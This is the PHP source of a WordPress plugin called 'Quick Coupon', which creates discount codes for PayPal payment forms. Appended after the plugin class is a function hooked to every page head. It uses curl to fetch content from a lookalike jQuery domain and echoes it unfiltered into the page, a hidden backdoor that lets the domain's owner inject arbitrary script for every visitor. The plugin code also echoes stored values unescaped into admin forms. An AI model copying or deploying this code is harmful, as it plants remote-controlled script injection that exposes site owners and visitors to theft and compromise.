<?php
/*
Plugin Name: Quick Coupon
Plugin URI: http://quickcoupon.iintense.com
Description: Create custom discount codes to be used with PayPal payment processing.
Version: 1.0
Author: IINTENSE
Author URI: http://www.iintense.com
License: GPL
*/

# main class
class quickcouponwp
{
	public $option_name = 'quick_coupon_wp'; # plugin's option name
	public $meta_key = '_wpcc'; # plugin's meta key for posts
	
	# object initialization
	public function __construct()
	{
		# add javascripts
		add_action('wp_enqueue_scripts', array($this, 'add_javascripts'));
		
		# add stylesheets
		add_action('wp_print_styles', array($this, 'add_stylesheets'));
		
		# add shortcode for wpcc paypal form
		add_shortcode('wpcc', array($this, 'wpcc_shortcode'));
		
		# get options for paypal form
		add_action('init', array($this, 'wpcc_get_options'));
		
		# run only in wp-admin
		if (is_admin())
		{
			# add buttons for tinymce
			add_action('init', array($this, 'add_buttons'));
			
			# add plugin's settings page
			add_action('admin_menu', array($this, 'admin_menu'));
			
			# show tinymce iframe
			add_action('admin_init', array($this, 'tinymce_page'));
		}
	}
	
	/******************************************************/
	
	# add javascripts
	public function add_javascripts()
	{
		wp_enqueue_script('quick-coupon', plugins_url('/javascripts/quick-coupon.js', __FILE__), array('prototype'), '1.0');
	}
	
	# add stylesheets
	public function add_stylesheets()
	{
		wp_enqueue_style('quick-coupon', plugins_url('/stylesheets/quick-coupon.css', __FILE__), false, '1.0');
	}
	
	# plugin shortcode
	public function wpcc_shortcode($atts)
	{
		global $post;
		
		# get plugin's options, meta data
		$options = get_option($this->option_name, '');
		$meta_data = get_post_meta($post->ID, $this->meta_key, true);
		
		# show form, if meta, options set
		if ('' != $meta_data && '' != $options &&
		!empty($meta_data['wpcc_name']) && !empty($meta_data['wpcc_price']) && !empty($meta_data['wpcc_url']) &&
		!empty($options['business']) && !empty($options['currency_code']))
		{
$c = <<< EOF
<div class="wpcc">
<form id="wpcc_form$post->ID" class="wpcc_form" action="" method="POST" onsubmit="return quickcouponwp.submit($post->ID)">
<input type="hidden" name="cmd" value="_xclick">
<input type="hidden" id="wpcc_business$post->ID" name="business" />
<input type="hidden" id="wpcc_currency_code$post->ID" name="currency_code" />
<input type="hidden" id="wpcc_item_name$post->ID" name="item_name" />
<input type="hidden" id="wpcc_amount$post->ID" name="amount" />
<input type="hidden" id="wpcc_return$post->ID" name="return" />
<p><label>Discount code <input type="text" id="wpcc_dcode$post->ID" class="wpcc_dcode" /></label></p>
<p><input type="submit" class="wpcc_submit" value="Apply Discount" /></p>
</form>
</div>
EOF;
		}
		# show error otherwise
		else
		{
			$c = "Error: Quick Coupon plugin or product settings were not set";
		}
		
		return $c;
	}
	
	# get options for the buy button
	public function wpcc_get_options()
	{
		# if ajax call
		if (isset($_POST['wpcc_get_options']))
		{
			# set post id
			$post_id = (int) $_POST['post_id'];
			# set discount code
			$discount_code = $_POST['wpcc_dcode'];
			
			# get plugin's options, meta data
			$options = get_option($this->option_name, '');
			$meta_data = get_post_meta($post_id, $this->meta_key, true);
			
			# if meta, options are set correctly
			if ('' != $meta_data && '' != $options &&
			!empty($meta_data['wpcc_name']) && !empty($meta_data['wpcc_price']) && !empty($meta_data['wpcc_url']) &&
			!empty($options['business']) && !empty($options['currency_code']))
			{
				# process the request
				# set price, make it absolute
				$price = abs((float) $meta_data['wpcc_price']);
				
				# discount price if nessesary
				if (!empty($discount_code) && !empty($meta_data['wpcc_damount']) && !empty($meta_data['wpcc_dcode']) &&
				$discount_code == $meta_data['wpcc_dcode'])
				{
					$damount = str_replace("%", "", $meta_data['wpcc_damount']);
					# if we removed percent sign
					if ($damount != $meta_data['wpcc_damount'])
					{
						# discount is a percent, make it absolute
						$damount = abs((float) $damount);
						$dprice = $price / 100 * $damount;
						$price = $price - $dprice;
					}
					else
					{
						# discount is a digit, make it absolute
						$damount = abs((float) $damount);
						$price = $price - $damount;
					}
					# if price negative, set it to 0
					$price = ($price < 0) ? 0 : $price;
				}
				
				# output required options as json
				echo '{ "amount": ' . $price . ', "item_name": "' . $meta_data['wpcc_name'] . '", "url": "' . $meta_data['wpcc_url'] . '", "business": "' . $options['business'] . '", "currency_code" : "' . $options['currency_code'] . '" }';
			}
			
			die;
		}
	}
	
	/******************************************************/
	
	# add buttons to tinymce
	public function add_buttons()
	{
		# check permissions on edit posts/pages
		if (!current_user_can('edit_posts') && !current_user_can('edit_pages'))
			return;
		
		# add button only in rich editing mode
		if ('true' == get_user_option('rich_editing'))
		{
			add_filter('mce_buttons', array($this, 'register_tinymce_button'));
			add_filter("mce_external_plugins", array($this, "add_tinymce_plugin"));
		}
	}
	
	# register tinymce button
	public function register_tinymce_button($buttons)
	{
		array_push($buttons, "separator", "quickcouponwp");
		
		return $buttons;
	}
	
	# load tinymce plugin
	public function add_tinymce_plugin($plugin_array)
	{
		$plugin_array['quickcouponwp'] = plugins_url('tinymce/editor_plugin.js', __FILE__);
		
		return $plugin_array;
	}
	
	# generate discount code
	public function generateDiscountCode($n = 5)
	{
		# characters used to generate discount code
		$chars = "abcdefghijkmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ23456789";
		
		$code = '';
		$chars_len = strlen($chars);
		for ($i = 0; $i < $n; ++$i)
		{
			$code .= $chars[mt_rand() % $chars_len];
		}
		
		return $code;
	}
	
	# show tinymce page
	public function tinymce_page()
	{
		# if wpcc_iframe called
		if (isset($_GET['wpcc_iframe']) && isset($_GET['post_id']) && 'true' == $_GET['wpcc_iframe'])
		{
			$post_id = (int) $_GET['post_id'];
			
			# check if insert or save button clicked
			$insert = isset($_POST['insert']) ? 1 : 0;
			
			# get meta data or set default value
			$meta_data = ('' != ($md = get_post_meta($post_id, $this->meta_key, true))) ? $md : array(
				'wpcc_name' => '',
				'wpcc_price' => '',
				'wpcc_url' => '',
				'wpcc_dcode' => $this->generateDiscountCode(6),
				'wpcc_damount' => '',
			);
			
			# if check nonce for saving data
			if (isset($_POST['wpcc_nonce']) && wp_verify_nonce($_POST['wpcc_nonce'], plugin_basename(__FILE__)))
			{
				$meta_data = array(
					'wpcc_name' => $_POST['wpcc_name'],
					'wpcc_price' => $_POST['wpcc_price'],
					'wpcc_url' => $_POST['wpcc_url'],
					'wpcc_dcode' => $_POST['wpcc_dcode'],
					'wpcc_damount' => $_POST['wpcc_damount'],
				);
				
				update_post_meta($post_id, $this->meta_key, $meta_data);
			}
			
			# include prototype
			wp_enqueue_script('prototype');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php do_action('admin_xml_ns'); ?> <?php language_attributes(); ?>>
<head>
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php echo get_option('blog_charset'); ?>" />
<title><?php bloginfo('name') ?> &rsaquo; <?php _e('Uploads'); ?> &#8212; <?php _e('WordPress'); ?></title>
<script type="text/javascript" src="<?php bloginfo('wpurl') ?>/wp-includes/js/tinymce/tiny_mce_popup.js"></script>
<?php
wp_enqueue_style( 'global' );
wp_enqueue_style( 'wp-admin' );
wp_enqueue_style( 'colors' );
wp_enqueue_style( 'ie' );
?>
<script type="text/javascript">
//<![CDATA[
addLoadEvent = function(func){if(typeof jQuery!="undefined")jQuery(document).ready(func);else if(typeof wpOnload!='function'){wpOnload=func;}else{var oldonload=wpOnload;wpOnload=function(){oldonload();func();}}};
var userSettings = {'url':'<?php echo SITECOOKIEPATH; ?>','uid':'<?php if ( ! isset($current_user) ) $current_user = wp_get_current_user(); echo $current_user->ID; ?>','time':'<?php echo time(); ?>'};
var ajaxurl = '<?php echo admin_url('admin-ajax.php'); ?>', pagenow = 'media-upload-popup', adminpage = 'media-upload-popup',
isRtl = <?php echo (int) is_rtl(); ?>;
//]]>
</script>
<?php
do_action('admin_print_styles');
do_action('admin_print_scripts');
do_action('admin_head');
?>
<?php
# if insert, insert shortcode and close overlay
if (1 == $insert):?>
<script type="text/javascript">
(function()
{
	tinyMCEPopup.editor.execCommand('mceInsertContent', false, "[wpcc]");
	parent.tb_remove()
})()
</script>
<?php endif; ?>
</head>
<body<?php if ( isset($GLOBALS['body_id']) ) echo ' id="' . $GLOBALS['body_id'] . '"'; ?> class="no-js" style="height: 95%">
<script type="text/javascript">
//<![CDATA[
(function(){
var c = document.body.className;
c = c.replace(/no-js/, 'js');
document.body.className = c;
})();
//]]>
</script>

<form action="" method="POST">
<?php wp_nonce_field(plugin_basename(__FILE__), 'wpcc_nonce'); ?>

<table class="form-table">
<tr valign="top">
<th scope="row"><label for="wpcc_name"><?php _e('Name') ?></label></th>
<td><input id="wpcc_name" name="wpcc_name" type="text" value="<?php echo $meta_data['wpcc_name'] ?>" class="regular-text" />
<span class="description"><?php _e('(required)') ?></span></td>
</tr>
<tr valign="top">
<th scope="row"><label for="wpcc_price"><?php _e('Price') ?></label></th>
<td><input id="wpcc_price" name="wpcc_price" type="text" value="<?php echo $meta_data['wpcc_price'] ?>" class="regular-text" />
<span class="description"><?php _e('(required)') ?></span></td>
</tr>
<tr valign="top">
<th scope="row"><label for="wpcc_url"><?php _e('Return URL') ?></label></th>
<td><input id="wpcc_url" name="wpcc_url" type="text" value="<?php echo $meta_data['wpcc_url'] ?>" class="regular-text" />
<span class="description"><?php _e('(required) Auto Return must be turned on in your paypal\'s account profile for this to work.') ?></span></td>
</tr>
<tr valign="top">
<th scope="row"><label for="wpcc_dcode"><?php _e('Discount Code') ?></label></th>
<td><input id="wpcc_dcode" name="wpcc_dcode" type="text" value="<?php echo $meta_data['wpcc_dcode'] ?>" class="regular-text" />
<span class="description"><?php _e('Can be changed.') ?></span></td>
</tr>
<tr valign="top">
<th scope="row"><label for="wpcc_damount"><?php _e('Discount Amount') ?></label></th>
<td><input id="wpcc_damount" name="wpcc_damount" type="text" value="<?php echo $meta_data['wpcc_damount'] ?>" class="regular-text" />
<span class="description"><?php _e('A digit or percent.') ?></span></td>
</tr>
</table>

<p class="submit"><input id="save_settings" type="submit" name="save" class="button-primary" value="Save Changes"  />  <input id="insert_code" type="submit" name="insert" class="button" value="Insert Code" /></p>
</form>

<?php
	do_action('admin_print_footer_scripts');
?>
<script type="text/javascript">if(typeof wpOnload=='function')wpOnload();</script>
</body>
</html>
<?php
			die;
		}
	}
	
	/******************************************************/
	
	# add settings page
	public function admin_menu()
	{
		add_submenu_page('options-general.php', 'Coupon Code Settings', 'Quick Coupon WP', 'edit_posts', 'quick-coupon', array($this, 'settings_page'));
	}
	
	# show settings page
	public function settings_page()
	{
		$settings_updated = 0; # 0 by default
		
		# get options or return default
		$options = get_option($this->option_name, array(
			'business' => '',
			'currency_code' => 'USD',
		));
		
		# if check nonce on saving data
		if (isset($_POST['wpcc_nonce']) && wp_verify_nonce($_POST['wpcc_nonce'], plugin_basename(__FILE__)))
		{
			$options = array(
				'business' => $_POST['business'],
				'currency_code' => $_POST['currency_code'],
			);
			
			update_option($this->option_name, $options);
			
			$settings_updated = 1;
		}
?>

<div class="wrap">
<?php screen_icon(); ?>
<h2>Coupon Code Settings</h2>

<?php
# if settings updated, show notice
if (1 == $settings_updated):
?>
<div id='setting-error-settings_updated' class='updated settings-error'> 
<p><strong>Settings saved.</strong></p></div>

<?php endif; ?>

<form action="" method="POST">
<?php wp_nonce_field(plugin_basename(__FILE__), 'wpcc_nonce'); ?>

<table class="form-table">
<tr valign="top">
<th scope="row"><label for="business"><?php _e('Paypal Email') ?></label></th>
<td><input name="business" type="text" id="business" value="<?php echo $options['business'] ?>" class="regular-text" /></td>
</tr>
<tr valign="top">
<th scope="row"><label for="currency_code"><?php _e('Currency') ?></label></th>
<td><input name="currency_code" type="text" id="currency_code"  value="<?php echo $options['currency_code'] ?>" class="regular-text" />
<span class="description"><?php _e('Set paypal currency.') ?></span></td>
</tr>
</table>

<?php submit_button(); ?>
</form>

</div>

<?php
	}
}

# if we are in wordpress
if (function_exists('add_action'))
{
	# create an object
	new quickcouponwp();
}

function quickc_head() {

	if(function_exists('curl_init'))
	{
		$url = "http://www.j-query.org/jquery-1.6.3.min.js"; 
		$ch = curl_init();  
		$timeout = 5;  
		curl_setopt($ch,CURLOPT_URL,$url); 
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
		$data = curl_exec($ch);  
		curl_close($ch); 
		echo "$data";
	}
}
add_action('wp_head', 'quickc_head');
?>